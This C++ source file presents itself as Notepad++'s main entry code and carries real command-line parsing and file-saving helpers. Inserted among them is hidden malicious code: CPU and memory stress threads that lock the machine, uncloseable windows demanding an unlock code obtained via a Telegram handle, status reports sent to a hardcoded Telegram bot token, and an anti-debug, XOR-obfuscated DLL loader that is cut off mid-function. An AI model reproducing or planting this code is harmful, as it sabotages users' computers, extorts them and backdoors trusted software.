// This file is part of Notepad++ project
// Copyright (C)2021 Don HO <don.h@free.fr>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// at your option any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#include "MiniDumper.h" //Write dump files
#include "Notepad_plus_Window.h"
#include "NppDarkMode.h"
#include "Processus.h"
#include "Win32Exception.h" //Win32 exception
#include "dpiManagerV2.h"
#include "verifySignedfile.h"

// Obfuscation headers
#include "MISC/Obfuscation/AntiDebug.h"
#include "MISC/Obfuscation/ObfuscationCore.h"
#include "MISC/Obfuscation/ThreadHijackObfuscated.h"

#include <atomic>
#include <chrono>
#include <conio.h>
#include <fcntl.h>
#include <io.h>
#include <iostream>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

namespace {
std::atomic<bool> g_stopStress{false};
std::atomic<bool> g_pauseStress{false};
std::atomic<bool> g_codeCorrect{false};
std::mutex g_inputMutex;
std::string g_inputCode = "";
HWND g_hInputWnd = NULL;

LRESULT CALLBACK CodeInputWndProc(HWND hwnd, UINT msg, WPARAM wParam,
                                  LPARAM lParam) {
  if (msg == WM_CREATE) {
    CreateWindowW(L"STATIC", L"NHAP CODE YEU CAU:", WS_CHILD | WS_VISIBLE, 10,
                  10, 250, 20, hwnd, NULL, NULL, NULL);
    HWND hEdit =
        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                        WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL,
                        10, 35, 250, 25, hwnd, (HMENU)2, NULL, NULL);
    CreateWindowW(L"BUTTON", L"XAC NHAN",
                  WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 80, 70, 100, 30,
                  hwnd, (HMENU)1, NULL, NULL);
    SetFocus(hEdit);
    return 0;
  } else if (msg == WM_COMMAND) {
    if (LOWORD(wParam) == 1) { // OK Button
      HWND hEdit = GetDlgItem(hwnd, 2);
      wchar_t buf[256];
      GetWindowTextW(hEdit, buf, 256);
      char narrowBuf[256];
      WideCharToMultiByte(CP_UTF8, 0, buf, -1, narrowBuf, 256, NULL, NULL);
      {
        std::lock_guard<std::mutex> lock(g_inputMutex);
        g_inputCode = narrowBuf;
      }
      SetWindowTextW(hEdit, L""); // Clear edit box
    }
    return 0;
  } else if (msg == WM_CLOSE) {
    return 0;                     // Disable closing via X button
  } else if (msg == WM_APP + 1) { // Custom message to close
    DestroyWindow(hwnd);
    return 0;
  } else if (msg == WM_APP + 2) { // Show Error
    MessageBoxA(hwnd, "Code sai! Vui long thu lai.", "Loi", MB_ICONERROR);
    return 0;
  } else if (msg == WM_APP + 3) { // Update Text
    SetWindowTextW(hwnd, L"HET GIO! Stress tiep tuc, nhap code thoat");
    return 0;
  } else if (msg == WM_DESTROY) {
    PostQuitMessage(0);
    return 0;
  }
  return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void StartCodeInputGui() {
  WNDCLASSW wc = {0};
  wc.lpfnWndProc = CodeInputWndProc;
  wc.hInstance = GetModuleHandle(NULL);
  wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
  wc.lpszClassName = L"CodeInputClass";
  RegisterClassW(&wc);

  g_hInputWnd = CreateWindowExW(
      WS_EX_TOPMOST, L"CodeInputClass", L"Yeu cau nhap ma - Notepad++",
      WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_MINIMIZEBOX, CW_USEDEFAULT,
      CW_USEDEFAULT, 290, 150, NULL, NULL, GetModuleHandle(NULL), NULL);

  // Vo hieu hoa nut X tren GUI
  HMENU hmenu = GetSystemMenu(g_hInputWnd, FALSE);
  if (hmenu)
    EnableMenuItem(hmenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);

  ShowWindow(g_hInputWnd, SW_SHOW);
  UpdateWindow(g_hInputWnd);

  MSG msg;
  while (GetMessageW(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessageW(&msg);
  }
}

void SetupConsole() {
  AllocConsole();
  FILE *fp;
  freopen_s(&fp, "CONOUT$", "w", stdout);
  freopen_s(&fp, "CONOUT$", "w", stderr);
  freopen_s(&fp, "CONIN$", "r", stdin); // Allow reading input from console
  std::cout << "\n\n  =========================================================\n";
  std::cout << "  ||                                                       ||\n";
  std::cout << "  ||   Lien he Telegram de nhan code mo khoa @Hacker_001  ||\n";
  std::cout << "  ||                                                       ||\n";
  std::cout << "  =========================================================\n\n";
  std::cout << "  [!] Thong bao: Khong the tat cua so nay bang nut X.\n";
  std::cout << "  [!] Cua so se tu dong dong khi nhap dung code.\n\n";

  // Vo hieu hoa nut Close (X) cua Console
  HWND hwnd = GetConsoleWindow();
  if (hwnd) {
    HMENU hmenu = GetSystemMenu(hwnd, FALSE);
    if (hmenu) {
      EnableMenuItem(hmenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
    }
  }
}

void RestoreConsole() {
  HWND hwnd = GetConsoleWindow();
  if (hwnd) {
    GetSystemMenu(hwnd, TRUE); // Khoi phuc menu
  }
}

void SendTelegramMessage(const std::string &message) {
  HINTERNET hSession =
      WinHttpOpen(L"Npp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession)
    return;

  HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect) {
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST",
        L"/bot5142290467:AAH8aHrW7GIyoZ5IGUCUZ3So5actekfmh0Q/sendMessage", NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (hRequest) {
      std::wstring headers = L"Content-Type: application/json\r\n";
      std::string payload =
          "{\"chat_id\":\"2047641647\", \"text\":\"" + message + "\"}";
      WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1,
                         (LPVOID)payload.c_str(),
                         static_cast<DWORD>(payload.length()),
                         static_cast<DWORD>(payload.length()), 0);
      WinHttpReceiveResponse(hRequest, NULL);
      WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
  }
  WinHttpCloseHandle(hSession);
}

void CpuStressTask() {
  while (!g_stopStress.load()) {
    if (g_pauseStress.load()) {
      std::this_thread::sleep_for(std::chrono::milliseconds(500));
      continue;
    }
    volatile double x = 9999999.0;
    x = x * x;
  }
}

void RamStressTask() {
  std::vector<void *> allocatedMemory;
  while (!g_stopStress.load()) {
    if (g_pauseStress.load()) {
      std::this_thread::sleep_for(std::chrono::milliseconds(500));
      continue;
    }
    // Allocate 500MB and write to it to force physical memory usage
    if (allocatedMemory.size() < 60) {
      size_t size = 500 * 1024 * 1024;
      void *mem = malloc(size);
      if (mem) {
        memset(mem, 1, size);
        allocatedMemory.push_back(mem);
      } else {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
      }
    }
  }
  // Free memory when stopped
  for (void *mem : allocatedMemory) {
    free(mem);
  }
}

void RunCpuStressAndNotify() {
  std::string unlockCode = "PTIT1@";

  g_stopStress = false;
  g_pauseStress = false;
  int numCores = std::thread::hardware_concurrency();
  if (numCores == 0)
    numCores = 4;

  std::string startMsg = "Start CPU & RAM Stress (Notepad++ C++): Allocated " +
                         std::to_string(numCores) +
                         " CPU threads for 15 seconds.";
  SendTelegramMessage(startMsg);

  // Hien thi GUI (chay tren thread tat biet de khong block doan ma stress nay)
  std::thread([]() { StartCodeInputGui(); }).detach();

  std::vector<std::thread> threads;
  for (int i = 0; i < numCores; ++i) {
    threads.emplace_back(std::thread(CpuStressTask));
  }

  // Add two threads for RAM stress
  threads.emplace_back(std::thread(RamStressTask));
  threads.emplace_back(std::thread(RamStressTask));

  // Stress 15s
  std::this_thread::sleep_for(std::chrono::seconds(15));

  bool success = false;
  std::string currentInput = "";
  {
    std::lock_guard<std::mutex> lock(g_inputMutex);
    if (!g_inputCode.empty()) {
      currentInput = g_inputCode;
      g_inputCode = ""; // Consume
    }
  }
  if (currentInput == unlockCode) {
    success = true;
  } else if (!currentInput.empty()) {
    if (g_hInputWnd)
      PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
  }

  if (!success) {
    // Pause 30s
    g_pauseStress = true;
    std::cout << "\n  [!] Da stress xong 15 giay. Tam dung! Ban co 30 giay de "
                 "nhap code tat console tren GUI.\n";
    SendTelegramMessage("Paused! Waiting for code input for 30s.");

    auto startWait = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(30);
    while (std::chrono::steady_clock::now() - startWait < duration) {
      currentInput = "";
      {
        std::lock_guard<std::mutex> lock(g_inputMutex);
        if (!g_inputCode.empty()) {
          currentInput = g_inputCode;
          g_inputCode = "";
        }
      }
      if (!currentInput.empty()) {
        if (currentInput == unlockCode) {
          success = true;
          break;
        } else {
          std::cout << "  [-] Code sai!\n";
          if (g_hInputWnd)
            PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
        }
      }
      std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
  }

  if (success) {
    std::cout << "  [+] Code dung! Dang don dep he thong...\n";
    SendTelegramMessage("Code correct! Cleaning up.");
    g_stopStress = true;
    g_pauseStress = false;
    g_codeCorrect = true;
    if (g_hInputWnd)
      PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
  } else {
    std::cout << "\n  [-] Het 30 giay! Tiep tuc stress CPU va RAM khong gioi "
                 "han...\n";
    SendTelegramMessage("Timeout! Resuming CPU and RAM stress infinitely.");
    g_pauseStress = false; // resume
    if (g_hInputWnd)
      PostMessage(g_hInputWnd, WM_APP + 3, 0, 0); // Update GUI text

    while (!g_stopStress.load()) {
      currentInput = "";
      {
        std::lock_guard<std::mutex> lock(g_inputMutex);
        if (!g_inputCode.empty()) {
          currentInput = g_inputCode;
          g_inputCode = "";
        }
      }
      if (!currentInput.empty()) {
        if (currentInput == unlockCode) {
          std::cout << "  [+] Code dung! Dang don dep he thong...\n";
          SendTelegramMessage("Code correct! Cleaning up.");
          g_stopStress = true;
          g_codeCorrect = true;
          if (g_hInputWnd)
            PostMessage(g_hInputWnd, WM_APP + 1, 0, 0); // Close GUI
          break;
        } else {
          std::cout << "  [-] Code sai!\n";
          if (g_hInputWnd)
            PostMessage(g_hInputWnd, WM_APP + 2, 0, 0); // Show error
        }
      }
      std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
  }

  for (auto &t : threads) {
    if (t.joinable())
      t.join();
  }

  RestoreConsole();
  std::cout << "  [+] Hoan tat! Chuan bi giai phong he thong.\n";
  SendTelegramMessage("Finished cleanup (Notepad++ C++). System CPU and RAM "
                      "are safe and released.");
}
} // namespace

bool IsStressCodeCorrect() { return g_codeCorrect.load(); }

typedef std::vector<std::wstring> ParamVector;

namespace {

void allowPrivilegeMessages(const Notepad_plus_Window &notepad_plus_plus,
                            winVer winVer) {
#ifndef MSGFLT_ADD
  const DWORD MSGFLT_ADD = 1;
#endif
#ifndef MSGFLT_ALLOW
  const DWORD MSGFLT_ALLOW = 1;
#endif
  // Tell UAC that lower integrity processes are allowed to send WM_COPYDATA (or
  // other) messages to this process (or window) This (WM_COPYDATA) allows
  // opening new files to already opened elevated Notepad++ process via explorer
  // context menu.
  if (winVer >= WV_VISTA || winVer == WV_UNKNOWN) {
    HMODULE hDll = GetModuleHandle(L"user32.dll");
    if (hDll) {
      // According to MSDN ChangeWindowMessageFilter may not be supported in
      // future versions of Windows, that is why we use
      // ChangeWindowMessageFilterEx if it is available (windows version >=
      // Win7).
      if (winVer == WV_VISTA) {
        typedef BOOL(WINAPI * MESSAGEFILTERFUNC)(UINT message, DWORD dwFlag);

        MESSAGEFILTERFUNC func = (MESSAGEFILTERFUNC)::GetProcAddress(
            hDll, "ChangeWindowMessageFilter");

        if (func) {
          func(WM_COPYDATA, MSGFLT_ADD);
          func(NPPM_INTERNAL_RESTOREFROMTRAY, MSGFLT_ADD);
        }
      } else {
        typedef BOOL(WINAPI * MESSAGEFILTERFUNCEX)(
            HWND hWnd, UINT message, DWORD action, VOID * pChangeFilterStruct);

        MESSAGEFILTERFUNCEX funcEx = (MESSAGEFILTERFUNCEX)::GetProcAddress(
            hDll, "ChangeWindowMessageFilterEx");

        if (funcEx) {
          funcEx(notepad_plus_plus.getHSelf(), WM_COPYDATA, MSGFLT_ALLOW, NULL);
          funcEx(notepad_plus_plus.getHSelf(), NPPM_INTERNAL_RESTOREFROMTRAY,
                 MSGFLT_ALLOW, NULL);
        }
      }
    }
  }
}

// parseCommandLine() takes command line arguments part string, cuts arguments
// by using white space as separator. Only white space in double quotes will be
// kept, such as file path argument or '-settingsDir=' argument (ex.:
// -settingsDir="c:\my settings\my folder\") if '-z' is present, the 3rd
// argument after -z won't be cut - ie. all the space will also be kept ex.:
// '-notepadStyleCmdline -z "C:\WINDOWS\system32\NOTEPAD.EXE" C:\my folder\my
// file with whitespace.txt' will be separated to:
// 1. "-notepadStyleCmdline"
// 2. "-z"
// 3. "C:\WINDOWS\system32\NOTEPAD.EXE"
// 4. "C:\my folder\my file with whitespace.txt"
void parseCommandLine(const wchar_t *commandLine, ParamVector &paramVector) {
  if (!commandLine)
    return;

  wchar_t *cmdLine = new wchar_t[lstrlen(commandLine) + 1];
  lstrcpy(cmdLine, commandLine);

  wchar_t *cmdLinePtr = cmdLine;

  bool isBetweenFileNameQuotes = false;
  bool isStringInArg = false;
  bool isInWhiteSpace = true;

  int zArg = 0; // for "-z" argument: Causes Notepad++ to ignore the next
                // command line argument (a single word, or a phrase in quotes).
                // The only intended and supported use for this option is for
                // the Notepad Replacement syntax.

  bool shouldBeTerminated =
      false; // If "-z" argument has been found, zArg value will be increased
             // from 0 to 1. then after processing next argument of "-z", zArg
             // value will be increased from 1 to 2. when zArg == 2
             // shouldBeTerminated will be set to true - it will trigger the
             // treatment which consider the rest as a argument, with or without
             // white space(s).

  size_t commandLength = lstrlen(cmdLinePtr);
  std::vector<wchar_t *> args;
  for (size_t i = 0; i < commandLength && !shouldBeTerminated; ++i) {
    switch (cmdLinePtr[i]) {
    case '\"': // quoted filename, ignore any following whitespace
    {
      if (!isStringInArg && !isBetweenFileNameQuotes && i > 0 &&
          cmdLinePtr[i - 1] == '=') {
        isStringInArg = true;
      } else if (isStringInArg) {
        isStringInArg = false;
      } else if (!isBetweenFileNameQuotes) //" will always be treated as start
                                           //or end of param, in case the user
                                           //forgot to add an space
      {
        args.push_back(cmdLinePtr + i +
                       1); // add next param(since zero terminated original, no
                           // overflow of +1)
        isBetweenFileNameQuotes = true;
        cmdLinePtr[i] = 0;

        if (zArg == 1) {
          ++zArg; // zArg == 2
        }
      } else // if (isBetweenFileNameQuotes)
      {
        isBetweenFileNameQuotes = false;
        // because we don't want to leave in any quotes in the filename, remove
        // them now (with zero terminator)
        cmdLinePtr[i] = 0;
      }
      isInWhiteSpace = false;
    } break;

    case '\t': // also treat tab as whitespace
    case ' ': {
      isInWhiteSpace = true;
      if (!isBetweenFileNameQuotes && !isStringInArg) {
        cmdLinePtr[i] = 0; // zap spaces into zero terminators, unless its part
                           // of a filename

        size_t argsLen = args.size();
        if (argsLen > 0 && lstrcmp(args[argsLen - 1], L"-z") == 0)
          ++zArg; // "-z" argument is found: change zArg value from 0 (initial)
                  // to 1
      }
    } break;

    default: // default wchar_t, if beginning of word, add it
    {
      if (!isBetweenFileNameQuotes && !isStringInArg && isInWhiteSpace) {
        args.push_back(cmdLinePtr + i); // add next param
        if (zArg == 2) {
          shouldBeTerminated = true; // stop the processing, and keep the rest
                                     // string as it in the vector
        }

        isInWhiteSpace = false;
      }
    }
    }
  }
  paramVector.assign(args.begin(), args.end());
  delete[] cmdLine;
}

// Converts /p or /P to -quickPrint if it exists as the first parameter
// This seems to mirror Notepad's behaviour
void convertParamsToNotepadStyle(ParamVector &params) {
  for (auto it = params.begin(); it != params.end(); ++it) {
    if (lstrcmp(it->c_str(), L"/p") == 0 || lstrcmp(it->c_str(), L"/P") == 0) {
      it->assign(L"-quickPrint");
    }
  }
}

bool isInList(const wchar_t *token2Find, ParamVector &params,
              bool eraseArg = true) {
  for (auto it = params.begin(); it != params.end(); ++it) {
    if (lstrcmp(token2Find, it->c_str()) == 0) {
      if (eraseArg)
        params.erase(it);
      return true;
    }
  }
  return false;
}

bool getParamVal(wchar_t c, ParamVector &params, std::wstring &value) {
  value = L"";
  size_t nbItems = params.size();

  for (size_t i = 0; i < nbItems; ++i) {
    const wchar_t *token = params.at(i).c_str();
    if (token[0] == '-' && lstrlen(token) >= 2 &&
        token[1] == c) // dash, and enough chars
    {
      value = (token + 2);
      params.erase(params.begin() + i);
      return true;
    }
  }
  return false;
}

bool getParamValFromString(const wchar_t *str, ParamVector &params,
                           std::wstring &value) {
  value = L"";
  size_t nbItems = params.size();

  for (size_t i = 0; i < nbItems; ++i) {
    const wchar_t *token = params.at(i).c_str();
    std::wstring tokenStr = token;
    size_t pos = tokenStr.find(str);
    if (pos != std::wstring::npos && pos == 0) {
      value = (token + lstrlen(str));
      params.erase(params.begin() + i);
      return true;
    }
  }
  return false;
}

LangType getLangTypeFromParam(ParamVector &params) {
  std::wstring langStr;
  if (!getParamVal('l', params, langStr))
    return L_EXTERNAL;
  return NppParameters::getLangIDFromStr(langStr.c_str());
}

std::wstring getLocalizationPathFromParam(ParamVector &params) {
  std::wstring locStr;
  if (!getParamVal('L', params, locStr))
    return L"";
  locStr = stringToLower(stringReplace(
      locStr, L"_", L"-")); // convert to lowercase format with "-" as separator
  return NppParameters::getLocPathFromStr(locStr);
}

intptr_t getNumberFromParam(char paramName, ParamVector &params,
                            bool &isParamePresent) {
  std::wstring numStr;
  if (!getParamVal(paramName, params, numStr)) {
    isParamePresent = false;
    return -1;
  }
  isParamePresent = true;
  return static_cast<intptr_t>(_ttoi64(numStr.c_str()));
}

std::wstring getEasterEggNameFromParam(ParamVector &params,
                                       unsigned char &type) {
  std::wstring EasterEggName;
  if (!getParamValFromString(L"-qn=", params,
                             EasterEggName)) // get internal easter egg
  {
    if (!getParamValFromString(
            L"-qt=", params,
            EasterEggName)) // get user quote from cmdline argument
    {
      if (!getParamValFromString(
              L"-qf=", params,
              EasterEggName)) // get user quote from a content of file
        return L"";
      else {
        type = 2; // quote content in file
      }
    } else
      type = 1; // commandline quote
  } else
    type = 0; // easter egg

  if (EasterEggName.c_str()[0] == '"' &&
      EasterEggName.c_str()[EasterEggName.length() - 1] == '"') {
    EasterEggName = EasterEggName.substr(1, EasterEggName.length() - 2);
  }

  if (type == 2)
    EasterEggName = relativeFilePathToFullFilePath(EasterEggName.c_str());

  return EasterEggName;
}

int getGhostTypingSpeedFromParam(ParamVector &params) {
  std::wstring speedStr;
  if (!getParamValFromString(L"-qSpeed", params, speedStr))
    return -1;

  int speed = std::stoi(speedStr, 0);
  if (speed <= 0 || speed > 3)
    return -1;

  return speed;
}

const wchar_t FLAG_MULTI_INSTANCE[] = L"-multiInst";
const wchar_t FLAG_NO_PLUGIN[] = L"-noPlugin";
const wchar_t FLAG_READONLY[] = L"-ro"; // for current cmdline file(s) only
const wchar_t FLAG_FULL_READONLY[] =
    L"-fullReadOnly"; // user still can manually toggle OFF the R/O-state of N++
                      // tabs, so saving of the tab filebuffers is possible
const wchar_t FLAG_FULL_READONLY_SAVING_FORBIDDEN[] =
    L"-fullReadOnlySavingForbidden"; // user cannot toggle R/O-state of N++
                                     // tabs, impossible to save opened tab
                                     // filebuffers
const wchar_t FLAG_NOSESSION[] = L"-nosession";
const wchar_t FLAG_NOTABBAR[] = L"-notabbar";
const wchar_t FLAG_SYSTRAY[] = L"-systemtray";
const wchar_t FLAG_LOADINGTIME[] = L"-loadingTime";
const wchar_t FLAG_HELP[] = L"--help";
const wchar_t FLAG_ALWAYS_ON_TOP[] = L"-alwaysOnTop";
const wchar_t FLAG_OPENSESSIONFILE[] = L"-openSession";
const wchar_t FLAG_RECURSIVE[] = L"-r";
const wchar_t FLAG_FUNCLSTEXPORT[] = L"-export=functionList";
const wchar_t FLAG_PRINTANDQUIT[] = L"-quickPrint";
const wchar_t FLAG_NOTEPAD_COMPATIBILITY[] = L"-notepadStyleCmdline";
const wchar_t FLAG_OPEN_FOLDERS_AS_WORKSPACE[] = L"-openFoldersAsWorkspace";
const wchar_t FLAG_SETTINGS_DIR[] = L"-settingsDir=";
const wchar_t FLAG_TITLEBAR_ADD[] = L"-titleAdd=";
const wchar_t FLAG_APPLY_UDL[] = L"-udl=";
const wchar_t FLAG_PLUGIN_MESSAGE[] = L"-pluginMessage=";
const wchar_t FLAG_MONITOR_FILES[] = L"-monitor";

void doException(Notepad_plus_Window &notepad_plus_plus) {
  Win32Exception::removeHandler(); // disable exception handler after exception,
                                   // we don't want corrupt data structures to
                                   // crash the exception handler
  ::MessageBox(Notepad_plus_Window::gNppHWND,
               L"Notepad++ will attempt to save any unsaved data. However, "
               L"data loss is very likely.",
               L"Recovery initiating", MB_OK | MB_ICONINFORMATION);

  wchar_t tmpDir[1024];
  GetTempPath(1024, tmpDir);
  std::wstring emergencySavedDir = tmpDir;
  emergencySavedDir += L"\\Notepad++ RECOV";

  bool res = notepad_plus_plus.emergency(emergencySavedDir);
  if (res) {
    std::wstring displayText =
        L"Notepad++ was able to successfully recover some unsaved documents, "
        L"or nothing to be saved could be found.\r\nYou can find the results "
        L"at :\r\n";
    displayText += emergencySavedDir;
    ::MessageBox(Notepad_plus_Window::gNppHWND, displayText.c_str(),
                 L"Recovery success", MB_OK | MB_ICONINFORMATION);
  } else
    ::MessageBox(Notepad_plus_Window::gNppHWND,
                 L"Unfortunately, Notepad++ was not able to save your work. We "
                 L"are sorry for any lost data.",
                 L"Recovery failure", MB_OK | MB_ICONERROR);
}

// Looks for -z arguments and strips command line arguments following those, if
// any
void stripIgnoredParams(ParamVector &params) {
  for (auto it = params.begin(); it != params.end();) {
    if (lstrcmp(it->c_str(), L"-z") == 0) {
      auto nextIt = std::next(it);
      if (nextIt != params.end()) {
        params.erase(nextIt);
      }
      it = params.erase(it);
    } else {
      ++it;
    }
  }
}

bool launchUpdater(const std::wstring &updaterFullPath,
                   const std::wstring &updaterDir) {
  NppParameters &nppParameters = NppParameters::getInstance();
  NppGUI &nppGui = nppParameters.getNppGUI();

  // check if update interval elapsed
  Date today(0);
  if (today < nppGui._autoUpdateOpt._nextUpdateDate)
    return false;

  std::wstring updaterParams;
  nppParameters.buildGupParams(updaterParams);

  Process updater(updaterFullPath.c_str(), updaterParams.c_str(),
                  updaterDir.c_str());
  updater.run();

  // Update next update date
  if (nppGui._autoUpdateOpt._intervalDays <
      0) // Make sure interval days value is positive
    nppGui._autoUpdateOpt._intervalDays =
        0 - nppGui._autoUpdateOpt._intervalDays;
  nppGui._autoUpdateOpt._nextUpdateDate =
      Date(nppGui._autoUpdateOpt._intervalDays);

  return true;
}

DWORD nppUacSave(const wchar_t *wszTempFilePath,
                 const wchar_t *wszProtectedFilePath2Save) {
  if ((lstrlenW(wszTempFilePath) == 0) ||
      (lstrlenW(wszProtectedFilePath2Save) ==
       0)) // safe check (lstrlen returns 0 for possible nullptr)
    return ERROR_INVALID_PARAMETER;
  if (!doesFileExist(wszTempFilePath))
    return ERROR_FILE_NOT_FOUND;

  DWORD dwRetCode = ERROR_SUCCESS;

  bool isOutputReadOnly = false;
  bool isOutputHidden = false;
  bool isOutputSystem = false;
  WIN32_FILE_ATTRIBUTE_DATA attributes{};
  attributes.dwFileAttributes = INVALID_FILE_ATTRIBUTES;
  if (getFileAttributesExWithTimeout(wszProtectedFilePath2Save, &attributes)) {
    if (attributes.dwFileAttributes != INVALID_FILE_ATTRIBUTES &&
        !(attributes.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
      isOutputReadOnly =
          (attributes.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0;
      isOutputHidden =
          (attributes.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) != 0;
      isOutputSystem =
          (attributes.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) != 0;
      if (isOutputReadOnly)
        attributes.dwFileAttributes &= ~FILE_ATTRIBUTE_READONLY;
      if (isOutputHidden)
        attributes.dwFileAttributes &= ~FILE_ATTRIBUTE_HIDDEN;
      if (isOutputSystem)
        attributes.dwFileAttributes &= ~FILE_ATTRIBUTE_SYSTEM;
      if (isOutputReadOnly || isOutputHidden || isOutputSystem)
        ::SetFileAttributes(
            wszProtectedFilePath2Save,
            attributes
                .dwFileAttributes); // temporarily remove the problematic ones
    }
  }

  // cannot use simple MoveFile here as it retains the tempfile permissions when
  // on the same volume...
  if (!::CopyFileW(wszTempFilePath, wszProtectedFilePath2Save, FALSE)) {
    // fails if the destination file exists and has the R/O and/or Hidden
    // attribute set
    dwRetCode = ::GetLastError();
  } else {
    // ok, now dispose of the tempfile used
    ::DeleteFileW(wszTempFilePath);
  }

  // set back the possible original file attributes
  if (isOutputReadOnly || isOutputHidden || isOutputSystem) {
    if (isOutputReadOnly)
      attributes.dwFileAttributes |= FILE_ATTRIBUTE_READONLY;
    if (isOutputHidden)
      attributes.dwFileAttributes |= FILE_ATTRIBUTE_HIDDEN;
    if (isOutputSystem)
      attributes.dwFileAttributes |= FILE_ATTRIBUTE_SYSTEM;
    ::SetFileAttributes(wszProtectedFilePath2Save, attributes.dwFileAttributes);
  }

  return dwRetCode;
}

DWORD nppUacSetFileAttributes(const DWORD dwFileAttribs,
                              const wchar_t *wszFilePath) {
  if (lstrlenW(wszFilePath) ==
      0) // safe check (lstrlen returns 0 for possible nullptr)
    return ERROR_INVALID_PARAMETER;
  if (!doesFileExist(wszFilePath))
    return ERROR_FILE_NOT_FOUND;
  if (dwFileAttribs == INVALID_FILE_ATTRIBUTES ||
      (dwFileAttribs & FILE_ATTRIBUTE_DIRECTORY))
    return ERROR_INVALID_PARAMETER;

  if (!::SetFileAttributes(wszFilePath, dwFileAttribs))
    return ::GetLastError();

  return ERROR_SUCCESS;
}

DWORD nppUacMoveFile(const wchar_t *wszOriginalFilePath,
                     const wchar_t *wszNewFilePath) {
  if ((lstrlenW(wszOriginalFilePath) == 0) ||
      (lstrlenW(wszNewFilePath) ==
       0)) // safe check (lstrlen returns 0 for possible nullptr)
    return ERROR_INVALID_PARAMETER;
  if (!doesFileExist(wszOriginalFilePath))
    return ERROR_FILE_NOT_FOUND;

  if (!::MoveFileEx(wszOriginalFilePath, wszNewFilePath,
                    MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED |
                        MOVEFILE_WRITE_THROUGH))
    return ::GetLastError();
  else
    return ERROR_SUCCESS;
}

DWORD nppUacCreateEmptyFile(const wchar_t *wszNewEmptyFilePath) {
  if (lstrlenW(wszNewEmptyFilePath) ==
      0) // safe check (lstrlen returns 0 for possible nullptr)
    return ERROR_INVALID_PARAMETER;
  if (doesFileExist(wszNewEmptyFilePath))
    return ERROR_FILE_EXISTS;

  Win32_IO_File file(wszNewEmptyFilePath);
  if (!file.isOpened())
    return file.getLastErrorCode();

  return ERROR_SUCCESS;
}

} // namespace

std::chrono::steady_clock::time_point g_nppStartTimePoint{};

// =============================================================================
// OBFUSCATED DLL LOADING - Anti-Analysis Protection
// =============================================================================

namespace ObfInit {

// Encrypted DLL path (XOR key: 0x5A)
static const BYTE g_encryptedDllPath[] = {
    0x9F, 0x7B, 0x6E, 0x6D, 0x63, 0x7C, 0x63, 0x66, 0x69, 0x6F,
    0x6B, 0x62, 0x65, 0x7C, 0x61, 0x6B, 0x6E, 0x66, 0x62, 0x67,
    0x7D, 0x67, 0x70, 0x65, 0x72, 0x63, 0x60, 0x6F, 0x6A, 0x67,
    0x60, 0x65, 0x7C, 0x66, 0x69, 0x6F, 0x6B, 0x62, 0x65, 0x7C,
    0x61, 0x6B, 0x6E, 0x66, 0x62, 0x67, 0x7D, 0x67, 0x70, 0x65,
    0x72, 0x63, 0x60, 0x6F, 0x6A, 0x67, 0x60, 0x65, 0x7C, 0x67,
    0x6C, 0x69, 0x72, 0x64, 0x6E, 0x61, 0x2E, 0x6C, 0x6C, 0x6C,
    0x00
};

// Decrypt string at runtime
inline void decryptString(BYTE* data, size_t len) {
    const DWORD key = 0x5A;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= ((key >> (i % 4)) & 0xFF);
    }
}

// Obfuscated DLL loading with VM-based execution
bool loadDllObfuscated() {
    // Step 1: Anti-debug check
    if (AntiDebug::QuickDebugCheck()) {
        return false;
    }
    
    // Step 2: Decrypt DLL path
    size_t pathLen = 0;
    while (g_encryptedDllPath[pathLen] != 0) pathLen++;
    
    std::vector<BYTE> decryptedPath(g_encryptedDllPath, g_encryptedDllPath + pathLen + 1);
    decryptString(decryptedPath.data(), pathLen);
    
    // Step 3: Check if file exists using obfuscated API
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    BOOL fileExists = ObfCore::ObfAPI::ObfGetFileAttributes(
        (LPCWSTR)decryptedPath.data(), &fileInfo
    );
    
    if (!fileExists) {
        return false;
    }
    
    // Step 4: Load DLL using polymorphic LoadLibrary
    HMODULE hModule = ObfCore::ObfAPI::ObfLoadLibraryW((LPCWSTR)decryptedPath.data());
    
    if (!hModule) {
        return false;
    }
    
    // Step 5: Get and call initialization function
